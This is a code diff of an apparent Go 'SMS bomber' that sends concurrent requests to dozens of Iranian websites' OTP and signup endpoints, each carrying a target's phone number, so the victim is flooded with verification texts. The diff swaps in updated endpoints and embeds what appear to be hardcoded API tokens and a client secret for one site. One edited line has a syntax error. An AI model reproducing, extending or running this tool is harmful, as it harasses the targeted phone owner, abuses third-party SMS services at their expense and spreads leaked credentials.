@@ -303,7 +303,7 @@ func main() {
 		go sms("https://sabziman.com/wp-admin/admin-ajax.php", map[string]interface{}{
 			"phonenumber": phone,
 		}, ch)  
-//70 ta site
+
 //////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 		go sms("https://flightio.com/bff/Authentication/CheckUserKey", map[string]interface{}{
 			"userKey": phone,
@@ -450,82 +450,40 @@ func main() {
 		}, ch)  // edit :4/22/2025
 		go sms("https://kafegheymat.com/shop/getLoginSms", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{
-			"cellphone": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://www.delino.com/user/register", map[string]interface{}{
 			"mobile": phone,
+		}, ch)  // edit :4/22/2025
+		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
+			"'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username'": phone,
 		}, ch)
 		go sms("https://1401api.tamland.ir/api/user/signup", map[string]interface{}{
 			"Mobile": phone,
 		}, ch)
-		go sms("https://shop.opco.co.ir/index.php?route=extension/module/login_verify/update_register_code", map[string]interface{}{
-			"telephone": phone,
-		}, ch)
-		go sms("https://melix.shop/site/api/v1/user/otp", map[string]interface{}{
+		go sms("https://melix.shop/site/api/v1/user/validate", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://safiran.shop/login", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://restaurant.delino.com/user/register", map[string]interface{}{
-			"'apiToken':'VyG4uxayCdv5hNFKmaTeMJzw3F95sS9DVMXzMgvzgXrdyxHJGFcranHS2mECTWgq','clientSecret':'7eVdaVsYXUZ2qwA9yAu7QBSH2dFSCMwq','device':'web','username'": phone,
-		}, ch)
-		go sms("https://garcon.tandori.ir/users/v1/main/login", map[string]interface{}{
+		}, ch)    // edit :4/22/2025
+		go sms("https://api.tandori.ir/client/users/login", map[string]interface{}{
 			"phone": phone,
-		}, ch)
-		go sms("https://dastkhat-isad.ir/api/v1/user/store", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://irwco.ir/register", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://api.arshiyan.com/send_code", map[string]interface{}{
-			"'country_code':'98','phone_number'": phone,
-		}, ch)
-		go sms("https://backend.topnoor.ir/web/v1/user/otp", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://api.alinance.com/user/register/mobile/send/", map[string]interface{}{
-			"phone_number": phone,
-		}, ch)
-		go sms("https://api.dadhesab.ir/user/entry", map[string]interface{}{
-			"username": phone,
-		}, ch)
-		go sms("https://app.dosma.ir/sendverify/", map[string]interface{}{
-			"username": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+		go sms("https://api6.arshiyaniha.com/api/v2/client/otp/send", map[string]interface{}{
+			"'country_code':'98','cellphone'": phone,
+		}, ch)  // edit :4/22/2025
 		go sms("https://api.ehteraman.com/api/request/otp", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
-		go sms("https://api-ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
+		}, ch)  // edit :4/22/2025
+		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
 			"msisdn": phone,
-		}, ch)
-		go sms("https://api.hbbs.ir/authentication/SendCode", map[string]interface{}{
-			"MobileNumber": phone,
-		}, ch)
-		go sms("https://api.iranamlaak.net/authenticate/send/otp/to/mobile/via/sms", map[string]interface{}{
-			"AgencyMobile": phone,
-		}, ch)
-		go sms("https://api.kcd.app/api/v1/auth/login", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://mazoocandle.ir/login", map[string]interface{}{
-			"phone": phone,
-		}, ch)
-		go sms("https://api.paymishe.com/api/v1/otp/registerOrLogin", map[string]interface{}{
-			"mobile": phone,
-		}, ch)
-		go sms("https://api.rayshomar.ir/api/Register/RegistrMobile", map[string]interface{}{
-			"MobileNumber": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
 		go sms("https://refahtea.ir/wp-admin/admin-ajax.php", map[string]interface{}{
 			"mobile": phone,
-		}, ch)
+		}, ch)   // edit :4/22/2025
 		go sms("https://mamifood.org/Registration.aspx/SendValidationCode", map[string]interface{}{
 			"Phone": phone,
-		}, ch)
+		}, ch)  // edit :4/22/2025
+		go sms("https://mamifood.org/Registration.aspx/IsUserAvailable", map[string]interface{}{
+			"cellphone": phone,
+		}, ch  // edit :4/22/2025
 		go sms("https://server.uphone.ir/api/v1/login/otp/request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
@@ -547,7 +505,9 @@ func main() {
 		go sms("https://api.watchonline.shop/api/v1/otp/request", map[string]interface{}{
 			"mobile": phone,
 		}, ch)
-//80 site
+		go sms("https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass?client=PWA&optionalClient=PWA&deviceType=PWA&appVersion=5.6.6&optionalVersion=5.6.6&UDID=bb65d956-f88b-4fec-9911-5f94391edf85", map[string]interface{}{
+			"cellphone": phone,
+		}, ch)
 		s1 := fmt.Sprintf("'phoneNumber':%s ,'email':''", phone)
 		go sms("https://abantether.com/users/register/phone/send/", map[string]interface{}{
 			s1: phone,
